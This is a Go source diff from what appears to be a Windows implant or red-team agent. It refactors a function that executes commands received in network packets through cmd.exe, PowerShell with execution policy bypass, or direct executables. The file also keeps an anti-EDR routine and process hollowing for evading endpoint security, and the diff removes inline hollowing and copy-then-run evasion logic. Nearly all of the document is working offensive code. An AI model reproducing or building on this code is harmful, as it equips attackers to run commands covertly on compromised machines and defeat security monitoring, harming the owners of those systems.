@@ -9,13 +9,10 @@ extern int Technique1();
 import "C"
 
 import (
-	"context"
-	"errors"
 	"fmt"
 	"io"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
@@ -31,7 +28,10 @@ import (
 	"golang.org/x/text/encoding/charmap"
 )
 
-var antiEdrActive bool = false
+var (
+	processTimeout time.Duration = 30 * time.Second
+	antiEdrActive  bool          = false
+)
 
 func AntiEdr() error {
 	if antiEdrActive {
@@ -110,55 +110,29 @@ func hollow(source, replace, name string, args []string) (int, []byte, []byte, i
 }
 
 func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
-	stdOut = make([]byte, 0)
-	stdErr = make([]byte, 0)
-	pid = 0
-	exitCode = 0
-	err = nil
-
-	processTimeout := 10 * time.Second
-	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
-	defer cancel()
-
 	shellType, ok := packetArgument["shelltype"]
 	if !ok {
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("no argument 'shelltype' given")
 	}
 
-	spawnType, ok := packetArgument["spawnType"]
-	if !ok {
-		spawnType = "standard"
-	}
-	spawnData, ok := packetArgument["spawnData"]
-	if !ok {
-		spawnData = ""
-	}
-
-	// Extract effective executable path and arguments
-	var executable string
-	var args []string
+	// Parse packet so we get all the things we need
 	switch shellType {
 	case "cmd":
 		commandStr, ok := packetArgument["commandline"]
 		if !ok {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no commandline")
 		}
-		commandStr = ResolveWinPath(commandStr)
-		executable = `C:\windows\system32\cmd.exe`
-		x := fmt.Sprintf(`cmd.exe /S /C "%s"`, commandStr)
-		args = []string{x}
+		return execCmdExe(commandStr)
 
 	case "powershell":
 		commandStr, ok := packetArgument["commandline"]
 		if !ok {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no commandline")
 		}
-		commandStr = ResolveWinPath(commandStr)
-		executable = `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe`
-		args = []string{"-ExecutionPolicy", "Bypass", "-C", commandStr}
+		return execPowershell(commandStr)
 
 	case "commandexec":
-		executable, ok = packetArgument["executable"]
+		executable, ok := packetArgument["executable"]
 		if !ok {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no executable")
 		}
@@ -166,109 +140,65 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		if !ok {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: no argline")
 		}
-		args = strings.Fields(argline)
+		args := strings.Fields(argline)
+
+		spawnType, ok := packetArgument["spawnType"]
+		if !ok {
+			spawnType = "standard"
+		}
+		spawnData, ok := packetArgument["spawnData"]
+		if !ok {
+			spawnData = ""
+		}
+
+		return execDirect(executable, args, spawnType, spawnData)
 
 	case "raw":
-		executable, args, err = model.MakePacketArgumentFrom(packetArgument)
-		executable = ResolveWinPath(executable)
+		executable, args, err := model.MakePacketArgumentFrom(packetArgument)
+		executable = ResolveWinVar(executable)
 		if err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
 		}
 
+		spawnType, ok := packetArgument["spawnType"]
+		if !ok {
+			spawnType = "standard"
+		}
+		spawnData, ok := packetArgument["spawnData"]
+		if !ok {
+			spawnData = ""
+		}
+
+		return execDirect(executable, args, spawnType, spawnData)
+
 	default:
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
 	}
+}
 
-	// Always resolve executable full path, we may need it
-	executable = ResolveWinPath(executable)
-	if filepath.Base(executable) == executable {
-		if lp, err := exec.LookPath(executable); err != nil {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Could not resolve: %s", executable)
+func execIt(cmd *exec.Cmd) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
+	stdOut = make([]byte, 0)
+	stdErr = make([]byte, 0)
+	pid = 0
+	exitCode = 0
+
+	stdOut, err = cmd.Output()
+	if err != nil {
+		if exitError, ok := err.(*exec.ExitError); ok {
+			stdErr = exitError.Stderr
+			pid = exitError.Pid()
+			exitCode = exitError.ProcessState.ExitCode()
 		} else {
-			executable = lp
-		}
-	}
-
-	/* Anti-EDR: copyFirst */
-	if spawnType == "copyFirst" {
-		destinationPath := spawnData
-		destinationPath = ResolveWinPath(destinationPath)
-		if destinationPath == "" {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
-		}
-		if !IsValidPath(destinationPath) {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Destination path invalid: %s", destinationPath)
-		}
-
-		err = CopyFile(executable, destinationPath)
-		if err != nil {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
-		}
-		// Destination is the new binary we execute
-		executable = destinationPath
-	}
-
-	cmd := exec.CommandContext(ctx, executable, args...)
-	/* Fix up windows exceptions in process parameter handling */
-	switch shellType {
-	case "cmd":
-		// cmd.exe is different
-		cmd.SysProcAttr = getSysProcAttrs()
-		cmd.SysProcAttr.CmdLine = args[0]
-
-	case "powershell":
-		// powershell.exe is different
-		cmd.SysProcAttr = getSysProcAttrs()
-	}
-
-	log.Infof("Executing: %s %v", executable, args)
-
-	// Inject?
-
-	// See how we want to execute it
-	if spawnType == "hollow" {
-		// Perform Process Hollowing
-		sourcePath := spawnData
-		if sourcePath == "" {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
-		}
-		sourcePath = ResolveWinPath(sourcePath)
-		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
-		}
-
-		// Activate Anti-EDR if not yet done
-		err = AntiEdr()
-		if err != nil {
-			log.Errorf("Anti EDR failed: %s", err.Error())
-			// We dont care if it doesnt work. No return.
-		}
-
-		fakeName := filepath.Base(sourcePath) // Need it without path
-		pid, stdOut, stdErr, exitCode, err = hollow(sourcePath, executable, fakeName, args)
-		if err != nil {
-			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Hollow error: %s", err)
-		}
-	} else {
-		// Execute the (possibly copied) binary directly
-		stdOut, err = cmd.Output()
-		if err != nil {
-			if exitError, ok := err.(*exec.ExitError); ok {
-				stdErr = exitError.Stderr
-				pid = exitError.Pid()
-				exitCode = exitError.ProcessState.ExitCode()
-			} else {
-				pid = 0
-				exitCode = cmd.ProcessState.ExitCode()
-
-			}
-		} else {
-			pid = cmd.ProcessState.Pid()
+			pid = 0
 			exitCode = cmd.ProcessState.ExitCode()
 		}
+		return stdOut, stdErr, pid, exitCode, err
+	} else {
+		pid = cmd.ProcessState.Pid()
+		exitCode = cmd.ProcessState.ExitCode()
 	}
 
-	return stdOut, stdErr, pid, exitCode, err
+	return stdOut, stdErr, pid, exitCode, nil
 }
 
 func getSysProcAttrs() *syscall.SysProcAttr {
@@ -280,7 +210,7 @@ func getSysProcAttrs() *syscall.SysProcAttr {
 // from https://gitlab.com/stu0292/windowspathenv/-/blob/master/windowsPathEnv.go (No license)
 // Resolve first element of a filepath as environment variable if enclosed in %. Only the first path element is considered as an environment variable. Eg:
 // %GOPATH%/bin/gitlab.com/stu-b-doo/
-func ResolveWinPath(filepath string) (out string) {
+func ResolveWinVar(filepath string) (out string) {
 	// return the original filepath unchanged unless we get to the end
 	out = filepath
 
